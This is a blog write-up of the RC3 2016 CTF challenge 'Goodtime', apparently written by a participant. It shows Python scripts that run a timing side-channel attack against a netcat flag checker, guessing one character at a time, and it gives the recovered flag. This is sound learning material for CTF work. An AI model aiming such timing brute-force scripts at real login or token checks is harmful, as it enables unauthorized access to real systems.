---
layout: post
title:  "RC3 2016 ~ Goodtime: Misc 150"
author: Vivi
date:   2016-11-20 04:29:33 -0700
categories: CTF Misc All
tags: RC3 Programming
---	

This is a challenge from RC3 2016. RC3 generally hosts a CTF every year and have been one of my favorite CTFs simply because it's a lot easier than the DefCon qualifying CTFs. This challenge in particular was extremely long for a measly 150 points. It's not very hard - just really annoying and inconsistent.


**Challenge Details**
------------------

```
Goodtime - 150
--------------
The flag is not on the youtube video, the flag on there is someone trying to confuse you. Sorry.
The flag is also longer than normal.
https://www.youtube.com/watch?v=H7HmzwI67ec
nc goodtime.ctf.rc3.club 5866
NOTE: there should be a prompt when you connect. if there isn't it went down so scream at me in IRC until I fix.

author: wumb0
```

Like any person would - the first I did was viewed the youtube video:

<iframe width="560" height="315" src="https://www.youtube.com/embed/H7HmzwI67ec" frameborder="0" allowfullscreen></iframe>

Obviously no clues here - it's just a video of Carly Rae Jepson. I did however get a good laugh when some guy posted a fake flag in the comments. Next thing to do was check out the netcat connection.

<figure>
<script height="800" type="text/javascript" src="https://asciinema.org/a/93602.js" id="asciicast-93602" async ></script>
   <figcaption> nc goodtime.ctf.rc3.club 5866</figcaption>
</figure>

After trying out the netcat server, when we input a flag that has the correct format it takes longer to respond. Since the title of this challenge is called goodtime - I'm going to assume the exploit is a timing attack. I would assume the server checks the input one character at a time. Thus an input of **Apple** have a shorter response time than **RC** simply because the server would check the "A" in "Apple" and stop - while the server would check **R**, then **C** then look for a **3** (RC3) in **RC**. Let's validate this by creating a script and testing it out.

[manualTime.py]({{site.github.url}}/assets/rc3/goodtime/manualTime.py)


```python
#!/usr/bin/env python
import time
import socket
import re
import sys

timer = time.clock if sys.platform == 'win32' else time.time

#host to connect to
host="54.167.134.245"
#the port with whatever u want 
port = 5866
#creating a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#default values
flag = ""
highestTime = 0
attempt= "RC3-2016-"
allowedChars = "klmnopqrstuvwxyz-ABCDEFGHIJKLMNOPQRSTUVWXYZ"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#start timer
start = timer()
#start connecction
s.connect((host, port))
#Recover 2014 bytes of response and print
data2 = s.recv(1024)
print data2
print "Attempting: " + attempt
#Send out flag
s.send(attempt + '\n')
#Read response
data2 = s.recv(1024)
#end timer
print timer()-start
```

This script pretty much creates a socket and connects to the netcat server via the host and port provided. I then connect to the server using that socket and read any incoming bytes. We then send our attempt for the flag. We then wait for a response and print out the time. This kind of socket scripting is useful when the server response is consistant. Here's what it looks like in usage.

<figure>
<script height="800" type="text/javascript" src="https://asciinema.org/a/93604.js" id="asciicast-93604" async ></script>
   <figcaption>manualTime.py</figcaption>
</figure>

Since now we know it's a timing attack and the flag format is "RC3-2016-XXXXX", we only need to guess the last line of the flag. The way to go about doing is to test every single character - like a brute-force attack.

> RC3-2016-a

> RC3-2016-b

> RC3-2016-c

> RC3-2016-d

> RC3-2016-e

> RC3-2016-f

Assuming we hit the right character - that response would be be quite larger than the other inputs. Thus we can just save the character with the longest response time and assume that's the next character in the flag. I automated this process in 

[goodtime.py]({{site.github.url}}/assets/rc3/goodtime/goodtime.py)


```python
#!/usr/bin/env python
import time
import socket
import re
import sys

timer = time.clock if sys.platform == 'win32' else time.time

host="54.167.134.245"
#the port with whatever u want 
port = 5866
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#default values
flag = "";
highestTime = 0;
attempt= ""
allowedChars = "abcdegfhijklmnopqrstuvwxyz-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"

for x in range(0,50):
	# Resets highestChar
	highestChar=""
	for x in allowedChars:
		#Creates attempt 1
		attempt = flag + x
		#Create socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#Start timer
		start = timer()
		#Connect to netcat
		s.connect((host, port))
		#Recover response
		data2 = s.recv(1024)
		print data2
		#Send flag
		print "Attempting: " + attempt
		s.send(attempt + '\n')
		#keep this to get the actual response
		data2 = s.recv(1024)
		#End timer
		time1 = timer()-start
		print "Time 1: " + str(time1)
		# print 'time taken ', timer()-start ,' seconds'
		if (timer()-start > highestTime):
			highestTime = timer()-start
			highestChar = x
		s.close()
		#attempt 2
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		start = timer()
		s.connect((host, port))
		data2 = s.recv(1024)
		s.send(attempt + '\n')
		#keep this to get the actual response
		data2 = s.recv(1024)
		time2 = timer()-start
		print "Time 2: " + str(time2)
		# print 'time taken ', timer()-start ,' seconds'
		average = (time1+time2)/2
		print "Average: " + str(average)
		if (average > highestTime):
			highestTime = average
			highestChar = x
		s.close()
	print "Adding [" + highestChar + "] to flag"
	flag = flag + highestChar;
	print "Current Flag: " + flag
```

Let's check it out in use:

<figure>
<script height="800" type="text/javascript" src="https://asciinema.org/a/93590.js" id="asciicast-93590" async ></script>
   <figcaption>manualTime.py</figcaption>
</figure>

Combining both the automation and the manual check we were able to get the flag. 

> RC3-2016-itz-alw4yz-a-g00d-t1m1ng-@tt@ck

Let's confirm

<figure>
<script height="800" type="text/javascript" src="https://asciinema.org/a/93610.js" id="asciicast-93610" async ></script>
   <figcaption>manualTime.py</figcaption>
</figure>

The hardest part of this was a lot of the time the connection was inconsistent. Any new characters I recieved from my script I had to triple check manually. When I saw the words **itz-al**, I already knew it was a carly rae reference. I manually input every version of **always** like **alw4ys** and **alw@ys** - one character at a time. Whenever the response time went up - I knew that was the correct character. The most trickiest part was after **g00d-t1m**. I thought I was done because I assumed the flag was **itz always a good time.** I had to bruteforce the second **1** for **t1m1ng**. I had no clue why it was a 1. Not only that but the **@tt@ck** at the end threw me off because I initially assumed the flag would be alphanumeric. The last word took me atleast 3 hours because the server kept crashing and each flag I input had a response time of atleast 10 seconds. To brute force the **@** it required all lowercase, uppercase, numbers, and punctuations - 10 seconds a piece. About 10 minutes if I was lucky the server didn't crash. At last though I was able to get the flag.